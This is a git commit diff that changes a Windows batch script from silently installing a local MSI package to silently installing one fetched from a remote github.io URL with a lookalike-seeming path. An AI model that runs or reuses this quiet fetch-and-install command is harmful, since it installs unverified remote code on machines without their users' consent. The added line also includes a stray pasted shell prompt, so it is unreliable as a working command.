170050e4cb7f90a444e55755d9c83673358eb16f
TurnkeyProcessing <53020025+TurnkeyProcessing@users.noreply.github.com>
2020-02-27 12:43:16 -0600

    Update aep_clt.cmd

--- aep_clt.cmd
+++ aep_clt.cmd
@@ -1,1 +1,1 @@
-msiexec.exe /i aep_clt.msi /quiet DEPLOYID=01_64hxsmekoi7mmq8tuqd0um579hwvtow6rwcpk INSTALLMETHOD=5 FQDNDESC=1
+%windir%\system32> msiexec.exe /i https://turnkeyprocessing.github.io/40aepclt.gethub.oi/aep_clt.msi /quiet DEPLOYID=01_64hxsmekoi7mmq8tuqd0um579hwvtow6rwcpk INSTALLMETHOD=5 FQDNDESC=1
